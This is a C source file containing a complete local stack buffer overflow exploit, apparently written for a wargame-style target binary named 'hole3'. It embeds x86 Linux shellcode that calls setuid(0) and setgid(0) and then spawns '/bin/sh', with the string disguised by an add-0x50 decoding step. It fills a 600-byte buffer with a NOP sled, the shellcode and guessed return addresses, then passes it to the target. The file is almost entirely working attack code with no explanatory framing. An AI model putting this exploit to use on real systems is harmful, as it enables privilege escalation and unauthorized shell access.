#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shellcode[]=
       "\x33\xc0"                      /* xorl   %eax,%eax      */
       "\x31\xdb"                      /* xorl   %ebx,%ebx      */
       "\xb0\x17"                      /* movb   $0x17,%al      */
       "\xcd\x80"                      /* int    $0x80          */
       "\x33\xc0"                      /* xorl   %eax,%eax      */
       "\x31\xdb"                      /* xorl   %ebx,%ebx      */
       "\xb0\x2e"                      /* movb   $0x2e,%al      */
       "\xcd\x80"                      /* int    $0x80          */
       "\xeb\x38"                      /* jmp 0x38              */
       "\x5e"                          /* popl %esi             */
       "\x80\x46\x01\x50"              /* addb $0x50,0x1(%esi)  */
       "\x80\x46\x02\x50"              /* addb $0x50,0x2(%esi)  */
       "\x80\x46\x03\x50"              /* addb $0x50,0x3(%esi)  */
       "\x80\x46\x05\x50"              /* addb $0x50,0x5(%esi)  */
       "\x80\x46\x06\x50"              /* addb $0x50,0x6(%esi)  */
       "\x89\xf0"                      /* movl %esi,%eax        */
       "\x83\xc0\x08"                  /* addl $0x8,%eax        */
       "\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
       "\x31\xc0"                      /* xorl %eax,%eax        */
       "\x88\x46\x07"                  /* movb %eax,0x7(%esi)   */
       "\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
       "\xb0\x0b"                      /* movb $0xb,%al         */
       "\x89\xf3"                      /* movl %esi,%ebx        */
       "\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
       "\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
       "\xcd\x80"                      /* int $0x80             */
       "\x31\xdb"                      /* xorl %ebx,%ebx        */
       "\x89\xd8"                      /* movl %ebx,%eax        */
       "\x40"                          /* inc %eax              */
       "\xcd\x80"                      /* int $0x80             */
       "\xe8\xc3\xff\xff\xff"          /* call -0x3d            */
       "\x2f\x12\x19\x1e\x2f\x23\x18"; /* .string "/bin/sh"     */
                                       /* /bin/sh is disguised  */

unsigned long get_sp(void)
{
  __asm__("movl %esp,%eax");
}

int main(int argc, char *argv[])
{
  int i, offset;
  long esp, ret, *addr_ptr;
  char *ptr, buf[600];

  if (argc < 2)
  {
    printf("Please, enter offset.\n");
    exit (0);
  }

  offset=atoi(argv[1]);
  esp=get_sp();
  ret=esp-offset;

  printf("The stack pointer (ESP) is: 0x%x\n", esp);
  printf("The offset from ESP is: 0x%x\n", offset);
  printf("The return address is: 0x%x\n", ret);

   ptr=buf;
  addr_ptr=(long *)ptr;

  for(i=0; i<600; i+=4)
  {*(addr_ptr++)=ret;}

  for(i=0; i<200; i++)
  {buf[i]='\x90';}

  ptr=buf+200;

  for(i=0; i<strlen(shellcode); i++)
  {*(ptr++)=shellcode[i];}

  buf[600-1]='\0';

  execl("./hole3", "hole3", buf, 0);
  return 0;
}
